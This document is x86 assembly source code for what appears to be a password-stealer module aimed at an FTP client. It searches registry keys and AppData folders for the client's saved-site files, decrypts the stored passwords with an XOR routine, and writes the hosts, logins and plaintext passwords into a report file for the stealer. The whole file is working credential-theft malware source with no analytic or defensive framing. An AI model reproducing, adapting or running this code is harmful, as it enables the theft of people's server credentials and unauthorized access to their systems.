      FXP_STEAL_SITES_DAT equ 1h
      FXP_STEAL_QUICK_DAT equ 2h


.data?
      fxp_sections     db  1000h dup (?)
      fxp_tmpbuf1      db  1000h dup (?)
      fxp_tmpbuf2      db  1000h dup (?)
      FXP_RegPath      db  100h  dup (?)
      FXP_pwdpath      db  100h  dup (?)
      fxp_sect_data1   db  100h  dup (?)
      fxp_sect_data2   db  100h  dup (?)
      fxp_sect_data3   db  100h  dup (?)
      fxp_sect_data4   db  100h  dup (?)
      fxp_key          db  100h  dup (?)
      dec_p            db  100h  dup (?)
      fxp_appdata      db  200h  dup (?)
      fxp_buf2                db 400h dup (?)
      fxp_val_Data            db 400h dup (?)
      fxp_val_RegValName      db 400h dup (?)

.code

EnumFXPReg proc hparamkey:DWORD
      LOCAL   hkey :DWORD
      LOCAL   index :DWORD
      LOCAL   bufsize :DWORD
      LOCAL   hkey2:DWORD
      LOCAL   enum_val_index:DWORD
      LOCAL   fxp_val_enum_RegDataSize :DWORD
      LOCAL   fxp_val_RegValNameSize   :DWORD
      
      lea     eax, hkey
      push    eax
      push    KEY_READ
      push    0
      push    offset fxp_regpath1
      push    hparamkey
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     fxp_failed_1
      mov     dword ptr [index], 0

    fxp_enum_loop:
      mov     bufsize, sizeof FXP_RegPath
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      lea     eax, bufsize
      push    eax
      push    offset FXP_RegPath
      push    dword ptr [index]
      push    dword ptr [hkey]
      call    dword ptr [_RegEnumKeyEx]
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      all_fxp_key_done
      inc     dword ptr [index]
      lstrcpy, addr FXP_pwdpath, addr fxp_regpath1
      lstrcat, addr FXP_pwdpath, addr sl
      lstrcat, addr FXP_pwdpath, addr FXP_RegPath
      
      ; enum val
      lea     eax, hkey2
      push    eax
      push    KEY_READ
      push    0
      push    offset FXP_pwdpath
      push    hparamkey
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     fxp_val_enum_total_failed
      mov     dword ptr [enum_val_index], 0
    fxp_enum_val_lp:
      mov     dword ptr [fxp_val_RegValNameSize], sizeof fxp_val_RegValName
      mov     dword ptr [fxp_val_enum_RegDataSize], sizeof fxp_val_Data
      lea     eax, fxp_val_enum_RegDataSize
      push    eax
      push    offset fxp_val_Data
      xor     eax, eax
      push    eax
      push    eax
      lea     eax, fxp_val_RegValNameSize
      push    eax
      push    offset fxp_val_RegValName
      push    dword ptr [enum_val_index]
      push    dword ptr [hkey2]
      call    _RegEnumValueA
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      fxp_val_enum_all_reg_done
      test    eax, eax
      jne     fxp_val_enum_badval
      cmp     dword ptr [fxp_val_enum_RegDataSize], 0
      je      fxp_val_enum_badval
      
    fxp_first_val_good:
      mov     recursive_index, 0
      push    offset FXPRecCallback
      push    offset fxp_val_Data
      call    SomeRecursiveFunc
      
    fxp_val_enum_badval:
      inc     dword ptr [enum_val_index]
      jmp     fxp_enum_val_lp
    fxp_val_enum_all_reg_done:
      push    dword ptr [hkey2]
      call    dword ptr [_RegCloseKey]
    fxp_val_enum_total_failed:

      jmp     fxp_enum_loop
    all_fxp_key_done:
    fxp_failed_1:
      ret
EnumFXPReg endp

GetFXPPwd proc
      LOCAL   WTF:DWORD

      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], FXP_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL

      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetFXPPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; check one shit
      invoke  EnumFXPReg, HKEY_LOCAL_MACHINE
      ; check another shit
      invoke  EnumFXPReg, HKEY_CURRENT_USER
      ; check appdatashit #1
      push    0
      push    CSIDL_APPDATA
      push    offset fxp_appdata
      push    0
      call    _SHGetSpecialFolderPath
      mov     recursive_index, 0
      push    offset FXPRecCallback
      push    offset fxp_appdata
      call    SomeRecursiveFunc
      ; check appdatashit #2
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset fxp_appdata
      push    0
      call    _SHGetSpecialFolderPath
      mov     recursive_index, 0
      push    offset FXPRecCallback
      push    offset fxp_appdata
      call    SomeRecursiveFunc
      ; check appdatashit #3
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset fxp_appdata
      push    0
      call    _SHGetSpecialFolderPath
      mov     recursive_index, 0
      push    offset FXPRecCallback
      push    offset fxp_appdata
      call    SomeRecursiveFunc
      
    GetFXPPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4

      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetFXPPwd endp

FXPRecCallback proc lpPath:DWORD, lpFilename:DWORD
      LOCAL   tmpflag:DWORD
      lstrcmp, addr fxp_pwd_file1, lpFilename
      .if     eax != 0
              lstrcmp, addr fxp_pwd_file2, lpFilename
              .if     eax == 0
                      mov     tmpflag, FXP_STEAL_SITES_DAT
                      jmp     fxp_good_file
              .endif
      .else
              mov     tmpflag, FXP_STEAL_QUICK_DAT
              jmp     fxp_good_file
      .endif
      jmp     fxp_mapping_error
    fxp_good_file:
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      
      push    dword ptr [tmpflag]
      push    dword ptr [lpPath]
      call    DecryptPasswordFXP
      
    fxp_mapping_error:
      ret
FXPRecCallback endp

DecryptPasswordFXP proc uses ebx path :DWORD, from :DWORD
      LOCAL   passpointer :DWORD
      LOCAL   fxp_key_size :DWORD
      LOCAL   prev :DWORD
      LOCAL   dout :DWORD

      GetPrivateProfileSectionNames, addr fxp_sections, sizeof fxp_sections, path

      mov     ebx, offset fxp_sections
    fxp_section_lp:
      lstrlen, ebx
      test    eax, eax
      je      fxp_all_sections_done

      ; IP
      GetPrivateProfileString, ebx, addr FXPIniStr1, addr fxpnilstr, addr fxp_sect_data1, sizeof fxp_sect_data1, path
      test    eax, eax
      je      fxp_next_section
      ; user
      GetPrivateProfileString, ebx, addr FXPIniStr2, addr fxpnilstr, addr fxp_sect_data2, sizeof fxp_sect_data2, path
      test    eax, eax
      je      fxp_next_section
      ; pass
      GetPrivateProfileString, ebx, addr FXPIniStr3, addr fxpnilstr, addr fxp_sect_data3, sizeof fxp_sect_data3, path
      test    eax, eax
      je      fxp_next_section
      ; created
      GetPrivateProfileString, ebx, addr FXPIniStr4, addr fxpnilstr, addr fxp_sect_data4, sizeof fxp_sect_data4, path
      test    eax, eax
      je      fxp_next_section

      ; create key
      .if     from == FXP_STEAL_QUICK_DAT
              lstrcpy, addr fxp_key, addr fxp_sect_data4
              lstrlen, addr fxp_key
              add     eax, offset fxp_key
              mov     byte ptr [eax], 03h
              inc     eax
              lstrcpy, eax, addr fxp_sect_data1
      .else ; FXP_STEAL_SITES_DAT
              lstrcpy, addr fxp_key, addr fxp_key_sites
      .endif
      lstrlen, addr fxp_key
      mov     dword ptr [fxp_key_size], eax

      ; decrypt loop
      push    ebx
      RtlZeroMemory, addr dec_p, sizeof dec_p
      xor     ebx, ebx
      mov     dword ptr [passpointer], offset fxp_sect_data3
      lstrcpy, addr fxp_tmpbuf1, addr oxie
      lstrcpyn, addr fxp_tmpbuf2, passpointer, 3
      add     dword ptr [passpointer], 2
      lstrcat, addr fxp_tmpbuf1, addr fxp_tmpbuf2
      lea     eax, prev
      push    eax
      push    1
      push    offset fxp_tmpbuf1
      call    dword ptr [_StrToIntEx]
      lstrlen, passpointer
      shr     eax, 1
      mov     ecx, eax
    dec_lp:
      push    ecx
      lstrcpy, addr fxp_tmpbuf1, addr oxie
      lstrcpyn, addr fxp_tmpbuf2, passpointer, 3
      add     dword ptr [passpointer], 2
      lstrcat, addr fxp_tmpbuf1, addr fxp_tmpbuf2
      lea     eax, dout
      push    eax
      push    1
      push    offset fxp_tmpbuf1
      call    dword ptr [_StrToIntEx]
      movzx   eax, byte ptr [fxp_key+ebx]
      .if     ebx >= fxp_key_size
              xor     ebx, ebx
      .else
              add     ebx, 1
      .endif
      xor     eax, dword ptr [dout]
      cmp     dword ptr [prev], eax
      jl      fxp_dec_here
      add     eax, 0FFh
      sub     eax, dword ptr [prev]
      jmp     fxp_dec_there
    fxp_dec_here:
      sub     eax, dword ptr [prev]
    fxp_dec_there:
      push    eax
      lstrlen, addr dec_p
      add     eax, offset dec_p
      pop     ecx
      mov     byte ptr [eax], cl
      mov     eax, dword ptr [dout]
      mov     dword ptr [prev], eax
      pop     ecx
      dec     ecx
      jnz     dec_lp
      pop     ebx

      lstrlen, addr dec_p
      test    eax, eax
      je      fxp_next_section

      lstrlen, addr fxp_sect_data1
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr fxp_sect_data1, plen, addr SNW, NULL
      lstrlen, addr fxp_sect_data2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr fxp_sect_data2, plen, addr SNW, NULL
      lstrlen, addr dec_p
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr dec_p, plen, addr SNW, NULL

    fxp_next_section:
      lstrlen, ebx
      add     ebx, eax
      add     ebx, 1
      jmp     fxp_section_lp
    fxp_all_sections_done:
      ret
DecryptPasswordFXP endp
